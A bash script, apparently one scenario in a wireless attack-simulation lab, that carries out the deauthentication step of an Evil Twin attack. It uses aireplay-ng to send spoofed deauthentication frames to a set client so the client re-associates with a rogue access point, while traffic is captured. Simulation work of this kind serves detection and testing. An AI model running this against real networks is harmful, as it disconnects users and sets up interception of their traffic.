#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SCENARIO_DIR="$BASH_DIR/scenarios"
SERVICES_DIR="$BASH_DIR/services"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t004.conf"

# ─── Dependencies ───
source "$HELPERS_DIR/fn_mode.sh"
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_prompt.sh"

# ─── Show Scenario ───
print_none "Threat:        $SCN_NAME"
print_none "Tool:          $SCN_TOOL"
print_none "Mode:          $SCN_MODE"
print_blank
print_wrapped_indent "Objective: " \
"This script performs the deauthentication component of an Evil Twin attack. It assumes that a genuine AP and a rogue (Evil Twin) AP are already broadcasting on the same channel.

The script sends spoofed deauthentication frames to a target client, forcing it to disconnect from the genuine AP. The client should then re-associate with the stronger Evil Twin AP, allowing for a Man-in-the-Middle position."
print_line

confirmation

# ─── Show Requirements ───
print_section "Requirements"
print_none "1. A genuine AP must be ONLINE (Target BSSID: $SCN_TARGET_BSSID)."
print_none "2. An Evil Twin AP with the same SSID ($SCN_SSID) must be ONLINE on the same channel."
print_none "3. A client device ($SCN_CLIENT_MAC) must be associated with the genuine AP."

confirmation

# ─── Show Capture Config ───
print_section "Capture Preparation"
print_none "Type:          $SCN_CAPTURE"
print_none "Channel:       $SCN_CHANNEL"
print_none "Duration:      $SCN_DURATION seconds"
print_blank
print_warn "IMPORTANT: Do NOT filter capture by BSSID. Both genuine and rogue AP traffic must be visible."
print_action "Launch Capture"

confirmation

# ─── Run Simulation ───
clear
print_section "Simulation"

# --- Prepare for Injection ---
print_action "Switching interface $INTERFACE to monitor mode..."
ensure_monitor_mode
print_success "Interface is in monitor mode."
print_blank

# --- Set Channel ---
print_action "Setting interface $INTERFACE to channel $SCN_CHANNEL..."
iw dev "$INTERFACE" set channel "$SCN_CHANNEL"
print_success "Channel set to $SCN_CHANNEL."
print_blank

# --- Launch Forced Disconnect ---
print_action "Sending deauthentication frames to client $SCN_CLIENT_MAC"
print_none "Spoofing genuine AP BSSID: $SCN_TARGET_BSSID"
aireplay-ng --deauth 5 -a "$SCN_TARGET_BSSID" -c "$SCN_CLIENT_MAC" "$INTERFACE"
print_success "Deauthentication frames sent."
print_blank

# --- Wait for Capture Duration ---
print_info "Waiting $SCN_DURATION seconds for client re-association and traffic capture..."
sleep "$SCN_DURATION"
print_blank

# --- Cleanup ---
print_action "Restoring interface to managed mode..."
ensure_managed_mode
print_success "Simulation completed."

exit 0